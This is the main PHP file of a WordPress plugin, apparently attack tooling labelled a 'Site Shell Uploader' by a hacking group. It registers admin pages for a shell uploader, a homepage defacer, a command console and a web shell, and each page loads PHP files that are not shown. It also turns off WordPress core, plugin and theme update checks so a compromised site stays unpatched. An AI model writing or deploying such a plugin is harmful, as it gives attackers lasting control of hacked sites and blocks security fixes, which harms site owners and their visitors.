<?php
/*
Plugin Name: BCG Uploader
Plugin URI: http://jhdteach.eu.org/
Description: Bangladesh Cyber Ghost 'Team - Made' WordPress Site Shell Uploader Plugin.
Author: MD Jahid Hasan
Author URI: https://www.facebook.com/safe.jahid
Text Domain: bcg-uploader
Version: 1.0
*/
define('PLUGIN_DIR_PATH',plugin_dir_path(__FILE__));
define('PLUGIN_URL',plugins_url());
define('PLUGIN_VERSION','1.0');
function bcg_menus(){
	add_menu_page(
		'bcguploader',
		'BCG Uploader',
		'manage_options',
		'bcg_uploader',
		'add_uploader_viewport',
		'dashicons-unlock',
		80);
	add_submenu_page('bcg_uploader',
		'bcgdashboard',
		'Dashboard',
		'manage_options',
		'bcg_uploader',
		'add_uploader_viewport');
	add_submenu_page('bcg_uploader',
		'uploader',
		'Shell Uploader',
		'manage_options',
		'bcgshell_uploader',
		'addup_viewport');
	add_submenu_page('bcg_uploader',
		'root_up',
		'Home Defacer',
		'manage_options',
		'rootup',
		'root_viewport');
	add_submenu_page('bcg_uploader',
		'cmd',
		'CMD',
		'manage_options',
		'cmd',
		'cmd_viewport');
	add_submenu_page('bcg_uploader',
		'bcgshell',
		'Shell',
		'manage_options',
		'bcg_shell',
		'a_mini');
	add_submenu_page('bcg_uploader',
		'mypanel',
		'BCG Panel',
		'manage_options',
		'bcg_settings',
		'my_page_settings');
	add_submenu_page('options-general.php',
		'settings',
		'BCG Uploader Settings',
		'manage_options',
		'main_settings',
		'my_page_settings');
}
add_action('admin_menu','bcg_menus');
function add_uploader_viewport(){
	echo 'X';
}
function addup_viewport(){
	include_once PLUGIN_DIR_PATH.'/inc/indtu.php';
}
function cmd_viewport(){
	include_once PLUGIN_DIR_PATH.'/inc/indte.php';
}
function root_viewport(){
	include_once PLUGIN_DIR_PATH.'/inc/intr.php';
}
function a_mini(){
	include_once PLUGIN_DIR_PATH.'/inc/jpsp.php';
}
function my_page_settings(){
	include_once PLUGIN_DIR_PATH.'/admin/satisf.php';
}
function bcg_assets(){
	wp_enqueue_style('bcg_style',
		PLUGIN_URL.'/bcg-uploader/assets/css/style.css',
        '',
        PLUGIN_VERSION            
);
	wp_enqueue_script('bcg_script',
		PLUGIN_URL.'/bcg-uploader/assets/js/script.js',
        '',
        PLUGIN_VERSION,
        true
	);
}
add_action('init','bcg_assets');
function remove_core_updates(){
        global $wp_version;
        return(object) array('last_checked'=> time(),'version_checked'=> $wp_version,);
    }
    add_filter('pre_site_transient_update_core','remove_core_updates');
    add_filter('pre_site_transient_update_plugins','remove_core_updates');
    add_filter('pre_site_transient_update_themes','remove_core_updates');

add_filter( 'plugin_action_links', 'ttt_wpmdr_add_action_plugin', 10, 5 );
function ttt_wpmdr_add_action_plugin( $actions, $plugin_file ) 
{
	static $plugin;

	if (!isset($plugin))
		$plugin = plugin_basename(__FILE__);
	if ($plugin == $plugin_file) {

			$settings = array('settings' => '<a href="options-general.php?page=main_settings">' . __('Settings', 'General') . '</a>');
			$site_link = array('support' => '<a href="admin.php?page=bcg_settings&do=supports">Support</a>');
		
    			$actions = array_merge($settings, $actions);
				$actions = array_merge($site_link, $actions);
			
		}
		
		return $actions;
}
